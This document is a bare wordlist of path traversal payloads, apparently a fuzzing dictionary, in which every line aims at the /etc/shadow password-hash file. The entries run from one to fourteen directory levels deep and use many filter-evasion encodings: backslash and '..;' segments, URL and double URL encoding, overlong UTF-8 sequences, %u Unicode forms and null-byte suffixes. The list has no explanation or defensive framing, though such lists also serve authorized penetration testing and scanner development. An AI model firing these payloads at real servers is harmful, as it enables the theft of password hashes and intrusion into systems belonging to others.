\..\etc/shadow
\..\..\etc/shadow
\..\..\..\etc/shadow
\..\..\..\..\etc/shadow
\..\..\..\..\..\etc/shadow
\..\..\..\..\..\..\etc/shadow
\..\..\..\..\..\..\..\etc/shadow
\..\..\..\..\..\..\..\..\etc/shadow
\..\..\..\..\..\..\..\..\..\etc/shadow
\..\..\..\..\..\..\..\..\..\..\etc/shadow
\..\..\..\..\..\..\..\..\..\..\..\etc/shadow
\..\..\..\..\..\..\..\..\..\..\..\..\etc/shadow
\..\..\..\..\..\..\..\..\..\..\..\..\..\etc/shadow
\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc/shadow
/..;/etc/shadow
/..;/..;/etc/shadow
/..;/..;/..;/etc/shadow
/..;/..;/..;/..;/etc/shadow
/..;/..;/..;/..;/..;/etc/shadow
/..;/..;/..;/..;/..;/..;/etc/shadow
/..;/..;/..;/..;/..;/..;/..;/etc/shadow
/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow
/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow
/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow
/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow
/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow
/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow
/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow
/..\/etc/shadow
/..\/..\/etc/shadow
/..\/..\/..\/etc/shadow
/..\/..\/..\/..\/etc/shadow
/..\/..\/..\/..\/..\/etc/shadow
/..\/..\/..\/..\/..\/..\/etc/shadow
/..\/..\/..\/..\/..\/..\/..\/etc/shadow
/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow
/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow
/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow
/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow
/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow
/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow
/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow
/./etc/shadow
/././etc/shadow
/./././etc/shadow
/././././etc/shadow
/./././././etc/shadow
/././././././etc/shadow
/./././././././etc/shadow
/././././././././etc/shadow
/./././././././././etc/shadow
/././././././././././etc/shadow
/./././././././././././etc/shadow
/././././././././././././etc/shadow
/./././././././././././././etc/shadow
/././././././././././././././etc/shadow
/../etc/shadow
/../../etc/shadow
/../../../etc/shadow
/../../../../etc/shadow
/../../../../../etc/shadow
/../../../../../../etc/shadow
/../../../../../../../etc/shadow
/../../../../../../../../etc/shadow
/../../../../../../../../../etc/shadow
/../../../../../../../../../../etc/shadow
/../../../../../../../../../../../etc/shadow
/../../../../../../../../../../../../etc/shadow
/../../../../../../../../../../../../../etc/shadow
/../../../../../../../../../../../../../../etc/shadow
/. . /etc/shadow
/. . /. . /etc/shadow
/. . /. . /. . /etc/shadow
/. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/...//etc/shadow
/...//...//etc/shadow
/...//...//...//etc/shadow
/...//...//...//...//etc/shadow
/...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//...//...//...//...//...//...//etc/shadow
/....//etc/shadow
/....//....//etc/shadow
/....//....//....//etc/shadow
/....//....//....//....//etc/shadow
/....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow
/..%2fetc/shadow
/..%2f..%2fetc/shadow
/..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow 
/%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow 
/%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/..%c0%afetc/shadow
/..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/%c0%2e%c0%2e%c0%2fetc/shadow
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow
/%uff0e%uff0e%u2215etc/shadow
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow
\..\etc/shadow%00
\..\..\etc/shadow%00
\..\..\..\etc/shadow%00
\..\..\..\..\etc/shadow%00
\..\..\..\..\..\etc/shadow%00
\..\..\..\..\..\..\etc/shadow%00
\..\..\..\..\..\..\..\etc/shadow%00
\..\..\..\..\..\..\..\..\etc/shadow%00
\..\..\..\..\..\..\..\..\..\etc/shadow%00
\..\..\..\..\..\..\..\..\..\..\etc/shadow%00
\..\..\..\..\..\..\..\..\..\..\..\etc/shadow%00
\..\..\..\..\..\..\..\..\..\..\..\..\etc/shadow%00
\..\..\..\..\..\..\..\..\..\..\..\..\..\etc/shadow%00
\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc/shadow%00 
/..;/etc/shadow%00
/..;/..;/etc/shadow%00
/..;/..;/..;/etc/shadow%00
/..;/..;/..;/..;/etc/shadow%00
/..;/..;/..;/..;/..;/etc/shadow%00
/..;/..;/..;/..;/..;/..;/etc/shadow%00
/..;/..;/..;/..;/..;/..;/..;/etc/shadow%00
/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow%00
/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow%00
/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow%00
/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow%00
/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow%00
/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow%00
/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/shadow%00
/..\/etc/shadow%00
/..\/..\/etc/shadow%00
/..\/..\/..\/etc/shadow%00
/..\/..\/..\/..\/etc/shadow%00
/..\/..\/..\/..\/..\/etc/shadow%00
/..\/..\/..\/..\/..\/..\/etc/shadow%00
/..\/..\/..\/..\/..\/..\/..\/etc/shadow%00
/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow%00
/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow%00
/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow%00
/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow%00
/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow%00
/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow%00
/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/shadow%00
/./etc/shadow%00
/././etc/shadow%00
/./././etc/shadow%00
/././././etc/shadow%00
/./././././etc/shadow%00
/././././././etc/shadow%00
/./././././././etc/shadow%00
/././././././././etc/shadow%00
/./././././././././etc/shadow%00
/././././././././././etc/shadow%00
/./././././././././././etc/shadow%00
/././././././././././././etc/shadow%00
/./././././././././././././etc/shadow%00
/././././././././././././././etc/shadow%00
/../etc/shadow%00
/../../etc/shadow%00
/../../../etc/shadow%00
/../../../../etc/shadow%00
/../../../../../etc/shadow%00
/../../../../../../etc/shadow%00
/../../../../../../../etc/shadow%00
/../../../../../../../../etc/shadow%00
/../../../../../../../../../etc/shadow%00
/../../../../../../../../../../etc/shadow%00
/../../../../../../../../../../../etc/shadow%00
/../../../../../../../../../../../../etc/shadow%00
/../../../../../../../../../../../../../etc/shadow%00
/../../../../../../../../../../../../../../etc/shadow%00 
/. . /etc/shadow%00
/. . /. . /etc/shadow%00
/. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/...//etc/shadow%00
/...//...//etc/shadow%00
/...//...//...//etc/shadow%00
/...//...//...//...//etc/shadow%00
/...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//...//...//...//...//...//...//etc/shadow%00
/....//etc/shadow%00
/....//....//etc/shadow%00
/....//....//....//etc/shadow%00
/....//....//....//....//etc/shadow%00
/....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow%00
